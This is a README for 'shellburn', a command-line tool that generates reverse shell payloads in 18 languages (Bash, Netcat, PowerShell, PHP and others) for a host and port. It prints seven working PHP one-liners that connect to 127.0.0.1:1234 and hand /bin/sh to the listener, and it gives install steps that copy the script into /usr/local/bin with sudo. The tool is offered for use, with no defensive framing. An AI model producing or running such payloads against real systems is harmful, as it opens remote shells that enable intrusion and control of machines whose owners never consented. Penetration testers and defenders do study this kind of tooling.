# shellburn
  this is the automate generetor of reverse shell's payload.
  
  first args are host, 2nd args to port
  
```
$ ./shellburn.py 127.0.0.1 1234

 (                                              
 )\ )    )       (   (    (                     
(()/( ( /(    (  )\  )\ ( )\    (   (           
 /(_)))\())  ))\((_)((_))((_)  ))\  )(    (     
(_)) ((_)\  /((_)_   _ ((_)_  /((_)(()\   )\ )  
/ __|| |(_)(_)) | | | | | _ )(_))(  ((_) _(_/(  
\__ \| ' \ / -_)| | | | | _ \| || || '_|| ' \)) 
|___/|_||_|\___||_| |_| |___/ \_,_||_|  |_||_|  
--------------------------------------------------
reverse_shell_payload_generator_


[>]YourIP: 127.0.0.1 [>]Port: 1234
```

appear the number for payloads 

```
+-+--->>
|0|Awk.
+-+---->>
|1|Bash.
+-+---------->>
|2|C_language.
+-+------>>
|3|Groovy.
+-+---->>
|4|Java.
+-+--->>
|5|Lua.
+-+---->>
|6|Ncat.
+-+------>>
|7|Netcat.
+-+------>>
|8|NodeJS.
+-+------->>
|9|OpenSSL.
+--+---->>
|10|Perl.
+--+---------->>
|11|Powershell.
+--+------>>
|12|Python.
+--+----->>
|13|Socat.
+--+------>>
|14|Telnet.
+--+------>>
|15|golang.
+--+--->>
|16|php.
+--+---->>
|17|ruby.
+-+---->>

[+]Select the Number of payload
> 
```

choise the number and then display the payload and that's included host and ports from args

```
[+]Select the Number of payload
> 16
[>]Selected: php

    php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("127.0.0.1",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("127.0.0.1",1234);`/bin/sh -i <&3 >&3 2>&3`;'
    
    php -r '$sock=fsockopen("127.0.0.1",1234);system("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("127.0.0.1",1234);passthru("/bin/sh -i <&3 >&3 2>&3");'
    
    php -r '$sock=fsockopen("127.0.0.1",1234);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
    
    php -r '$sock=fsockopen("127.0.0.1",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
    
$ 

```
# Execute like a Command in anywhere

```
git clone https://github.com/Ki11i0n4ir3/shellburn.git

cd shellburn

chmod +x shellburn.py

sudo cp shellburn.py /usr/local/bin/shellburn

sudo cp -r shellpalm /usr/local/bin/shellpalm

shellburn <Lhost> <Lport>

```


![alt text](https://github.com/Ki11i0n4ir3/gifs/blob/main/kids_geek.gif)
